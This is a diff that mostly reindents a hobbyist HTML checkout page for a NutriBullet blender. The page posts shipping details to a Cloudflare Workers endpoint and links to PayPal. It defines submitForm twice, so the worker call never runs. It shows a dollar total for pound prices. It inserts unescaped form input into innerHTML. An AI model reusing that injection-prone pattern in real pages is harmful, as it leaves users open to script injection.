@@ -5,171 +5,140 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Checkout</title>
     <style>
- /* Base CSS */
-/* Reset CSS */
-body {
-    font-family: Arial, sans-serif;
-    background-color: #f4f4f4;
-    margin: 0;
-    padding: 0;
-}
+        /* Base CSS */
+        /* Reset CSS */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
 
-.container {
-    display: flex;
-    flex-direction: column;
-    max-width: 90vw;
-    margin: 5vw auto;
-    background-color: #fff;
-    padding: 5vw;
-    border-radius: 4vw;
-    box-shadow: 0 0 2vw rgba(0, 0, 0, 0.1);
-}
+        .container {
+            display: flex;
+            flex-direction: column;
+            max-width: 90vw;
+            margin: 5vw auto;
+            background-color: #fff;
+            padding: 5vw;
+            border-radius: 4vw;
+            box-shadow: 0 0 2vw rgba(0, 0, 0, 0.1);
+        }
 
-.card {
-    position: fixed;
-    bottom: 5vw;
-    right: 5vw;
-    width: 30vw;
-    padding: 4vw;
-    background-color: #ffffff;
-    border-radius: 4vw;
-    box-shadow: 0 1vw 2vw rgba(0, 0, 0, 0.1);
-    transition: box-shadow 0.3s ease-in-out;
-}
+        .card {
+            margin-top: 20px; /* Add margin to create space between the form and the card */
+            width: auto; /* Let the card width adjust based on content */
+            padding: 4vw;
+            background-color: #ffffff;
+            border-radius: 4vw;
+            box-shadow: 0 1vw 2vw rgba(0, 0, 0, 0.1);
+            transition: box-shadow 0.3s ease-in-out;
+        }
 
-.card:hover {
-    box-shadow: 0 2vw 4vw rgba(0, 0, 0, 0.2);
-}
+        .card:hover {
+            box-shadow: 0 2vw 4vw rgba(0, 0, 0, 0.2);
+        }
 
-/* Media Queries for Mobile Devices */
-@media only screen and (min-width: 380px) and (max-width: 480px) and (min-height: 730px) and (max-height: 850px) {
-    /* Adjustments for mobile devices */
-    .container {
-        max-width: 90vw;
-        margin: 2vw auto;
-        padding: 3vw;
-        border-radius: 2vw;
-    }
+        /* Media Queries for Mobile Devices */
+        @media only screen and (min-width: 380px) and (max-width: 480px) and (min-height: 730px) and (max-height: 850px) {
+            /* Adjustments for mobile devices */
+            .container {
+                max-width: 90vw;
+                margin: 2vw auto;
+                padding: 3vw;
+                border-radius: 2vw;
+            }
 
-    .card {
-        width: 90vw;
-        padding: 4vw;
-        top: 2vw;
-        right: auto;
-        left: 5vw;
-        box-shadow: 0 1vw 2vw rgba(0, 0, 0, 0.1);
-    }
+            .card {
+                width: 90vw;
+                padding: 4vw;
+                top: 2vw;
+                right: auto;
+                left: 5vw;
+                box-shadow: 0 1vw 2vw rgba(0, 0, 0, 0.1);
+            }
 
-    h1 {
-        font-size: 5vw;
-    }
+            label,
+            input[type="text"],
+            input[type="email"],
+            select,
+            input[type="submit"] {
+                width: 90%;
+                max-width: 80vw;
+                padding: 5vw;
+                font-size: 4vw;
+                border: 1px solid #ccc; /* Add border for better visibility */
+                border-radius: 8px; /* Add border radius for rounded corners */
+                box-sizing: border-box; /* Ensure padding and border are included in width */
+                margin-bottom: 3vw;
+            }
 
-    h2 {
-        font-size: 4vw;
-    }
+            .half-width,
+            .third-width {
+                width: 80%;
+                max-width: 75vw;
+                margin-bottom: 3vw;
+            }
 
-  label,
-input[type="text"],
-input[type="email"],
-select,
-input[type="submit"] {
-    width: 90%;
-    max-width: 80vw;
-    padding: 5vw;
-    font-size: 4vw;
-    border: 1px solid #ccc; /* Add border for better visibility */
-    border-radius: 8px; /* Add border radius for rounded corners */
-    box-sizing: border-box; /* Ensure padding and border are included in width */
-    margin-bottom: 3vw;
-}
+            .name-fields,
+            .address-fields {
+                margin-bottom: 3vw;
+            }
 
-.half-width,
-.third-width {
-    width: 80%;
-    max-width: 75vw;
-    margin-bottom: 3vw;
-}
+            .quantity-input {
+                width: 30vw;
+                padding: 4vw;
+                font-size: 4vw;
+                border: 1px solid #ccc; /* Add border for better visibility */
+                border-radius: 8px; /* Add border radius for rounded corners */
+                box-sizing: border-box; /* Ensure padding and border are included in width */
+                margin-bottom: 3vw;
+            }
 
-.name-fields,
-.address-fields {
-    margin-bottom: 3vw;
-}
+            .confirm-pay-btn {
+                width: 90%;
+                max-width: 80vw;
+                padding: 5vw;
+                font-size: 4vw;
+                margin-top: 5vw;
+                background-color: #007bff; /* Add background color */
+                color: #fff; /* Set text color */
+                border: none; /* Remove border */
+                border-radius: 8px; /* Add border radius for rounded corners */
+                cursor: pointer; /* Add cursor pointer */
+            }
 
-.quantity-input {
-    width: 30vw;
-    padding: 4vw;
-    font-size: 4vw;
-    border: 1px solid #ccc; /* Add border for better visibility */
-    border-radius: 8px; /* Add border radius for rounded corners */
-    box-sizing: border-box; /* Ensure padding and border are included in width */
-    margin-bottom: 3vw;
-}
+            .confirm-pay-btn:hover {
+                background-color: #0056b3; /* Change background color on hover */
+            }
 
-.confirm-pay-btn {
-    width: 90%;
-    max-width: 80vw;
-    padding: 5vw;
-    font-size: 4vw;
-    margin-top: 5vw;
-    background-color: #007bff; /* Add background color */
-    color: #fff; /* Set text color */
-    border: none; /* Remove border */
-    border-radius: 8px; /* Add border radius for rounded corners */
-    cursor: pointer; /* Add cursor pointer */
-}
+            .quantity-selector label {
+                margin-bottom: 3vw;
+            }
 
-.confirm-pay-btn:hover {
-    background-color: #0056b3; /* Change background color on hover */
-}
+            hr {
+                margin: 3vw 0;
+            }
 
-.quantity-selector label {
-    margin-bottom: 3vw;
-}
+            /* Rounded product image */
+            .product-image {
+                width: 80vw; /* Set the width to fill the container */
+                max-width: 200px; /* Set a maximum width */
+                height: auto; /* Maintain aspect ratio */
+                margin-right: 20px;
+                margin-top: 20px;
+                border-radius: 8px; /* Make the image appear rounded */
+                overflow: hidden;
+            }
 
-hr {
-    margin: 3vw 0;
-}
-
-/* Rounded product image */
-.product-image {
-    width: 100%; /* Set the width to fill the container */
-    max-width: 96px; /* Set a maximum width */
-    height: auto; /* Maintain aspect ratio */
-    margin-right: 20px;
-    margin-top: 20px;
-    border-radius: 50%; /* Make the image appear rounded */
-    overflow: hidden;
-}
-
-.product-image img {
-    width: 100%; /* Ensure the image fills its container */
-    height: 100%; /* Ensure the image fills its container */
-    object-fit: cover; /* Maintain aspect ratio and cover the container */
-}
-
-   .card {
-    margin-top: 20px; /* Add margin to create space between the form and the card */
-}
-
-@media screen and (max-width: 480px) {
-    .container {
-        margin: 20px auto; /* Center the container horizontally */
-        max-width: 90%; /* Adjust the maximum width for smaller screens */
-    }
-
-    .card {
-        position: relative; /* Remove fixed positioning */
-        top: auto; /* Remove top positioning */
-        right: auto; /* Remove right positioning */
-        width: auto; /* Let the card width adjust based on content */
-        margin-top: 20px; /* Add margin to create space between the form and the card */
-    }
-}
-
-
-
+            .product-image img {
+                width: 100%; /* Ensure the image fills its container */
+                height: 100%; /* Ensure the image fills its container */
+                object-fit: cover; /* Maintain aspect ratio and cover the container */
+            }
+        }
     </style>
-     <script src="https://cdn.jsdelivr.net/npm/@twilio/sdk@3.59.0/dist/twilio.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@twilio/sdk@3.59.0/dist/twilio.min.js"></script>
 </head>
 <body>
 <div class="container">
@@ -181,81 +150,81 @@ hr {
         <div class="product-details">
             <div class="product-title">NUTRIBULLET 600W STARTER KIT SMOOTHIE MAKER TABLE TOP BLENDER</div>
             <div class="product-price">£65.50</div>
-           <div class="quantity-selector">
-    <label for="quantity">Quantity:</label>
-    <div class="quantity-controls">
-        <input type="number" id="quantity" name="quantity" class="quantity-input" min="1" max="10" value="1">
-    </div>
-</div>
+            <div class="quantity-selector">
+                <label for="quantity">Quantity:</label>
+                <div class="quantity-controls">
+                    <input type="number" id="quantity" name="quantity" class="quantity-input" min="1" max="10" value="1">
+                </div>
+            </div>
 
             <div class="postage">Postage</div>
             <div>4-6 days</div>
         </div>
     </div>
-     <hr style="border: none; border-top: 1px solid #ccc; margin: 10px 0;">
+    <hr style="border: none; border-top: 1px solid #ccc; margin: 10px 0;">
     <h2>Post to</h2>
-  <form id="checkout-form" action="https://worker-blue-wind-1446.bashirmubarak08.workers.dev/" method="post">
-   
-    <select id="country" name="country" required>
-        <option value="">Select Country</option>
-        <option value="US">United States</option>
-        <option value="UK">United Kingdom</option>
-        <!-- Add more options as needed -->
-    </select>
-    <div class="name-fields">
-        <div>
-            <input type="text" id="fname" name="fname" required placeholder="First Name">
-        </div>
-        <div>
-            <input type="text" id="lname" name="lname" required placeholder="Surname">
-        </div>
-    </div>
-    <div class="address-fields">
-        <div>
-            <input type="text" id="address" name="address" required placeholder="Street Address">
-        </div>
-        <div>
-            <input type="text" id="address2" name="address2" placeholder="Address Line 2 (optional)">
-        </div>
-    </div>
-    <div class="third-width">
-        <input type="text" id="city" name="city" required placeholder="City">
-    </div>
-    <div class="third-width">
-        <select id="state" name="state" required>
-            <option value="">Select State/Province</option>
-            <option value="NY">New York</option>
-            <option value="CA">California</option>
+    <form id="checkout-form" action="https://worker-blue-wind-1446.bashirmubarak08.workers.dev/" method="post">
+
+        <select id="country" name="country" required>
+            <option value="">Select Country</option>
+            <option value="US">United States</option>
+            <option value="UK">United Kingdom</option>
             <!-- Add more options as needed -->
         </select>
-    </div>
-    <div class="third-width">
-        <input type="text" id="postcode" name="postcode" required placeholder="Postcode">
-    </div>
+        <div class="name-fields">
+            <div>
+                <input type="text" id="fname" name="fname" required placeholder="First Name">
+            </div>
+            <div>
+                <input type="text" id="lname" name="lname" required placeholder="Surname">
+            </div>
+        </div>
+        <div class="address-fields">
+            <div>
+                <input type="text" id="address" name="address" required placeholder="Street Address">
+            </div>
+            <div>
+                <input type="text" id="address2" name="address2" placeholder="Address Line 2 (optional)">
+            </div>
+        </div>
+        <div class="third-width">
+            <input type="text" id="city" name="city" required placeholder="City">
+        </div>
+        <div class="third-width">
+            <select id="state" name="state" required>
+                <option value="">Select State/Province</option>
+                <option value="NY">New York</option>
+                <option value="CA">California</option>
+                <!-- Add more options as needed -->
+            </select>
+        </div>
+        <div class="third-width">
+            <input type="text" id="postcode" name="postcode" required placeholder="Postcode">
+        </div>
 
-    <input type="button" value="Confirm Details" onclick="submitForm()">
-</form>
-  
-<div id="summary-list" style="display: none;"></div>
-<div class="card">
-    <h3 class="card-title">Order Summary</h3>
-    <div class="order-summary">
-        <div class="summary-item">
-            <label>Item:</label> <span id="summary-item">1</span>
+        <input type="button" value="Confirm Details" onclick="submitForm()">
+    </form>
+
+    <div id="summary-list" style="display: none;"></div>
+    <div class="card">
+        <h3 class="card-title">Order Summary</h3>
+        <div class="order-summary">
+            <div class="summary-item">
+                <label>Item:</label> <span id="summary-item">1</span>
+            </div>
+            <div class="summary-item">
+                <label>Postage:</label> <span id="summary-postage">£4.00</span>
+            </div>
+            <hr>
+            <div class="summary-item">
+                <label>Order Total:</label> <span id="summary-total">$XX.XX</span>
+            </div>
+            <!-- Pay button linking to PayPal -->
+            <button onclick="window.location.href = 'https://www.paypal.com/ncp/payment/A3E3Y95ABXA78'" class="pay-button">Pay here</button>
         </div>
-        <div class="summary-item">
-            <label>Postage:</label> <span id="summary-postage">£4.00</span>
-        </div>
-        <hr>
-        <div class="summary-item">
-            <label>Order Total:</label> <span id="summary-total">$XX.XX</span>
-        </div>
-        <!-- Pay button linking to PayPal -->
-        <a href="https://www.paypal.com/ncp/payment/A3E3Y95ABXA78" class="pay-button">Pay here</a>
     </div>
 </div>
-    </div>
-    <script>
+<script>
     document.addEventListener('DOMContentLoaded', function() {
         const quantityInput = document.getElementById('quantity');
         const totalPriceElement = document.getElementById('summary-total');
@@ -268,7 +237,7 @@ hr {
         // Function to calculate and update the total
         function updateTotal() {
             const quantity = parseInt(quantityInput.value);
-            const total = (pricePerItem * quantity)+ postage;
+            const total = (pricePerItem * quantity) + postage;
             totalPriceElement.textContent = `$${total.toFixed(2)}`;
             itemElement.textContent = quantity; // Update item count in summary
         }
@@ -279,57 +248,59 @@ hr {
         // Initial total update
         updateTotal();
     });
-   function submitForm() {
-    // Get form data
-    var formData = new FormData(document.getElementById("checkout-form"));
 
-    // Send form data to Cloudflare Worker endpoint
-    fetch('https://worker-blue-wind-1446.bashirmubarak08.workers.dev/', {
-        method: 'POST',
-        body: formData
-    })
-    .then(response => {
-        if (!response.ok) {
-            throw new Error('Network response was not ok');
-        }
-        return response.text();
-    })
-    .then(data => {
-        console.log(data); // Log response from server
-        // Optionally, display a success message
-        alert('Form submitted successfully!');
-    })
-    .catch(error => {
-        console.error('There was a problem with the fetch operation:', error);
-        // Handle error condition
-        alert('There was an error submitting the form.');
-    });
-}
-function submitForm() {
-    // Get form data
-    var formData = new FormData(document.getElementById("checkout-form"));
+    function submitForm() {
+        // Get form data
+        var formData = new FormData(document.getElementById("checkout-form"));
 
-    // Compose summary list
-    var summaryList = document.getElementById("summary-list");
-    summaryList.innerHTML = `
-        <ul>
-            <li>First Name: ${formData.get('fname')}</li>
-            <li>Last Name: ${formData.get('lname')}</li>
-            <li>Address: ${formData.get('address')}</li>
-            <li>Address 2: ${formData.get('address2')}</li>
-            <li>City: ${formData.get('city')}</li>
-            <li>State: ${formData.get('state')}</li>
-            <li>Postcode: ${formData.get('postcode')}</li>
-            <!-- Add more fields as needed -->
-        </ul>
-    `;
+        // Send form data to Cloudflare Worker endpoint
+        fetch('https://worker-blue-wind-1446.bashirmubarak08.workers.dev/', {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+            return response.text();
+        })
+        .then(data => {
+            console.log(data); // Log response from server
+            // Optionally, display a success message
+            alert('Form submitted successfully!');
+        })
+        .catch(error => {
+            console.error('There was a problem with the fetch operation:', error);
+            // Handle error condition
+            alert('There was an error submitting the form.');
+        });
+    }
 
-    // Show the summary list
-    summaryList.style.display = "block";
+    function submitForm() {
+        // Get form data
+        var formData = new FormData(document.getElementById("checkout-form"));
 
-    // Hide the form
-    document.getElementById("checkout-form").style.display = "none";
-}
+        // Compose summary list
+        var summaryList = document.getElementById("summary-list");
+        summaryList.innerHTML = `
+            <ul>
+                <li>First Name: ${formData.get('fname')}</li>
+                <li>Last Name: ${formData.get('lname')}</li>
+                <li>Address: ${formData.get('address')}</li>
+                <li>Address 2: ${formData.get('address2')}</li>
+                <li>City: ${formData.get('city')}</li>
+                <li>State: ${formData.get('state')}</li>
+                <li>Postcode: ${formData.get('postcode')}</li>
+                <!-- Add more fields as needed -->
+            </ul>
+        `;
+
+        // Show the summary list
+        summaryList.style.display = "block";
+
+        // Hide the form
+        document.getElementById("checkout-form").style.display = "none";
+    }
 </script>
 </body>
 </html>
